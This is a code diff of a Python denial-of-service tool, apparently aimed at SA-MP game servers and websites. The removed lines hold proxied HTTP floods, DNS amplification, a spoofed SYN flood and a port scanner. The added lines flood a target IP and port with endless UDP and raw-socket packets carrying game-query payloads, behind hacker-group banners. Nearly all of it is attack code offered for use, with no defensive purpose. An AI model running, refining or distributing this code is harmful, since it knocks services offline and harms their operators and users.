@@ -1,168 +1,262 @@
+#Since : 25-07-2022
+#-------[ ALL IMPORT ]-------#
 import socket
-import random
-import requests
+import struct
+import codecs
+import sys
 import threading
-import subprocess
+import random
 import time
-from scapy.all import *
+import os
+#-------[ ALL SETTINGS ]-------#
+ip = sys.argv[1]
+port = sys.argv[2]
 
-credit = """
-\033[1;36m
-▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
-▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
-▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
-░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
-▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
-▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓ 
-  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
-  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
-      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░ 
-                                         ░                  ░        ░         ░ ░                       ░           
-╔════════════════════════╗
-║ Created by: CazzySoci  ║
-║                        ║
-║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
-║                        ║
-║  We Are AnonCazzySoci  ║
-║    •We don't die       ║
-║    •We Multiply        ║
-║    •Expect us!         ║
-╚════════════════════════╝
-\033[1;36m
-"""
-print(credit)
-target_url = input("Target URL: ")
-start_port = 1
-end_port = 100
+#ip = str(input("IP TARGET:"))
+#port = int(input("PORT TARGET:"))
+
 fake_ip = '66.118.234.34:22'
 
-def generate_user_agent():
-    with open("ua.txt", "r") as file:
-        user_agents = file.read().splitlines()
-    return random.choice(user_agents)
+proxysy = open('cazzy.txt').readlines()
+bots = len(proxysy)
+user = ('ADMIN')
+#---------------------[ Randomlex CODE ]---------------------#
+Randomlex = [
+ b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00',
+ b'SAMP\x958\xe1\xa9a\x1ec',
+ b'SAMP\x958\xe1\xa9a\x1ei',
+ b'SAMP\x958\xe1\xa9a\x1er',
+ b'SAMP\x958\xe1\xa9a\x1ev',
+ b'SAMP\x958\xe1\xa9a\x1eg',
+ b'\x08\x1eb\xda',
+ b'\x08\x1eb\xda',
+ b'\x02\x1e\xfdS',
+ b'\x08\x1eM\xda',
+ b'\x02\x1e\xfd@',
+ b'\x08\x1e~\xda'
+ ]
+prot = (random.randint(200,350))
+sys.stdout.write("\x1b]2;[-] ULTRAS | Online User : [{}] | Running Attack [1] | Bot Connected [{}] | Username : {}\x07".format (prot,bots,user))
 
-def send_get_request(url, proxy):
-    headers = {
-        "User-Agent": generate_user_agent()
-    }
-    proxies = {
-        "http": proxy,
-        "https": proxy
-    }
-    response = requests.get(url, headers=headers, proxies=proxies)
-    return response
+os.system("clear")
+#---------------------[ BANNER'S ]---------------------
+banner =  """
+\033[36m                        ╔════════════════════════════════════╗
+\033[36m                        ║       \033[33m╦ ╦ ╦  ═╦═ ╦═╗ ╔═╗ ╔═╗       \033[36m║
+\033[36m                        ║       \033[33m║ ║ ║   ║  ╠╦╝ ╠╩╣ ╚═╗       \033[36m║
+\033[36m                        ║       \033[33m╚═╝ ╩═╝ ╩  ╩╚═ ╩ ╩ ╚═╝       \033[36m║
+\033[36m                        ╚════════════════════════════════════╝
+\033[35m                   ╔═══════════════════════════════════════════╗                 
+\033[35m                   ║ \033[32m- -ATTACKING SERVER  (\033[33mAWAS DOWN BWANG\033[32m)- - \033[35m║
+\033[35m                   ╚═══════════════════════════════════════════╝
+"""
+banners = """
+\033[36m                      ╔════════════════════════════════════╗
+\033[36m                      ║\033[33m         ╦  ╔═╗═╗ ╦╔═╗╦ ╦╦ ╦\033[36m        ║
+\033[36m                      ║\033[33m         ║  ║╣ ╔╩╦╝║ ║╚╦╝╚╦╝\033[36m        ║
+\033[36m                      ║\033[33m         ╩═╝╚═╝╩ ╚═╚═╝ ╩  ╩ \033[36m        ║
+\033[36m                      ╚════════════════════════════════════╝
+\033[35m                    ╔═════════════════════════════════════════════╗                 
+\033[35m                    ║  \033[32m- -DEVELOPER TOOLS ULTRAS  (\033[33mLEX SA-MP\033[33m)- -\033[35m  ║
+\033[35m                    ╚═════════════════════════════════════════════╝
+"""
+welcome =  """
+───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───   Welcome! to ULTRASS
+───█▒▒░░░░░░░░░▒▒█───   Use "help" For Help Command
+────█░░█░░░░░█░░█────   Developer Tools : Lexyy / LEX SA-MP
+─▄▄──█░░░▀█▀░░░█──▄▄─   
+█░░█─▀▄░░░░░░░▄▀─█░░█
+█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
+█░░║║║╠─║─║─║║║║║╠─░░█
+█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
+"""
 
-def generate_malicious_ip():
-    ip_list = []
-    for _ in range(10000):  
-        ip = ""
-        for _ in range(4):
-            ip += str(random.randint(1, 255)) + "."
-        ip = ip[:-1]
-        ip_list.append(ip)
-    return ip_list
+print(welcome)
+time.sleep(3)
+os.system("clear")
+print(banner)
+time.sleep(0.9)
+print ("\033[36m[BOT] \033[32m• \033[33mYOU ATTACK HAS LAUNCHED TO IP \033[31m%s \033[32mAND PORT \033[31m%s"%(ip,port))
 
-def perform_ddos_attack(proxy_list, bot_count):
-    while True:
-        url = f"http://{target_url}"
-        if target_url.startswith("https"):
-            url = f"https://{target_url}"
-        
-        proxy = random.choice(proxy_list)
-        response = send_get_request(url, proxy)
-        print(f"Botnet {bot_count}: DDoS attack on {url} using proxy {proxy}...")
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '4.240.112.191'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
 
-        time.sleep(0.001) 
-
-def scan_ports():
-    for port in range(start_port, end_port + 1):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(1)
-        result = sock.connect_ex((target_url, port))
-        if result == 0:
-            print(f"Port {port} is open")
-        sock.close()
-
-def dns_amplification_attack(target_ip):
-    target_port = 53
-    query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04test\x03com\x00\x00\x01\x00\x01"
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        sock.sendto(query, (target_ip, target_port))
-
-def syn_flood_attack(target_ip):
-    target_port = 80
-    
-    while True:
-        ip = IP(src=RandIP(), dst=target_ip)
-        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-        packet = ip / tcp
-        send(packet)
-
-def http_flood_attack(target_url):
-    while True:
-        response = requests.get(target_url)
-        print(f"HTTP Flood Attack on {target_url}...")
-
-def send_udp_packets():
+#--------------[ START DDOS BY LEXYY ]--------------#
+def xxxxxxx():
     while True:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(random.randint(0, 255) for _ in range(65535)), (target_ip, target_port))
+        bytes = random._urandom(1081) #1081
+        pack = random._urandom(999) #666
+        payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'#ATTACK HEX
+        msg = Randomlex[random.randrange(0, 9)]
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(pack, (ip, int(port)))
+        sock.sendto(payload, (ip, int(port)))
+        sock.sendto(msg, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-def send_tcp_syn_packets():
+def xxxxxx():
     while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target_ip, target_port))
-        sock.send(b"SYN Flood Attack")
+        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+        bytes = random._urandom(1460)
+        payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(payload, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-def send_http_get_requests():
+def xxxxx():
     while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target_ip, target_port))
-        request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
-        sock.send(request)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1081) #1081
+        pack = random._urandom(999) #666
+        msg = Randomlex[random.randrange(0, 9)]
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(pack, (ip, int(port)))
+        sock.sendto(msg, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-def execute_script():
-    # Read the proxy list from a txt file
-    proxy_list = []
-    with open("cazzy.txt", "r") as file:
-        proxy_list = file.read().splitlines()
+def xxxx():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+        bytes = random._urandom(1460)
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-    udp_thread = threading.Thread(target=send_udp_packets)
-    tcp_syn_thread = threading.Thread(target=send_tcp_syn_packets)
-    http_thread = threading.Thread(target=send_http_get_requests)
+def xxx():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1081) #1081
+        pack = random._urandom(666) #666
+        msg = Randomlex[random.randrange(0, 9)]
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(pack, (ip, int(port)))
+        sock.sendto(msg, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
+                
+def xx():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+        bytes = random._urandom(1460)
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-    udp_thread.start()
-    tcp_syn_thread.start()
-    http_thread.start()
+def x():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1081) #1081
+        pack = random._urandom(999) #666
+        msg = Randomlex[random.randrange(0, 9)]
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(pack, (ip, int(port)))
+        sock.sendto(msg, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
+        
+              
+              
+#---------------------[ AUTO RUN ]---------------------#
+if __name__ == '__main__':
+    try:
+      xxxxxxx()
+      xxxxxx()
+      xxxxx()
+      xxxx()
+      xxx()
+      xx()
+      x()
 
-    botnet_count = 0
-    ddos_attack_threads = []
-    for _ in range(500):
-        botnet_count += 1
-        ddos_attack_thread = threading.Thread(target=perform_ddos_attack, args=(proxy_list, botnet_count))
-        ddos_attack_threads.append(ddos_attack_thread)
-
-    for thread in ddos_attack_threads:
-        thread.start()
-
-    scan_ports()
-
-    dns_amplification_thread = threading.Thread(target=dns_amplification_attack, args=(target_url,))
-    dns_amplification_thread.start()
-
-    syn_flood_thread = threading.Thread(target=syn_flood_attack, args=(target_url,))
-    syn_flood_thread.start()
-
-    http_flood_thread = threading.Thread(target=http_flood_attack, args=(target_url,))
-    http_flood_thread.start()
-
-    for thread in ddos_attack_threads:
-        thread.join()
-    dns_amplification_thread.join()
-    syn_flood_thread.join()
-    http_flood_thread.join()
-
-if __name__ == "__main__":
-    execute_script()
+#---------------------[ CLOSING ]---------------------#
+    except KeyboardInterrupt:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print("\033[0;37;40mclosed")
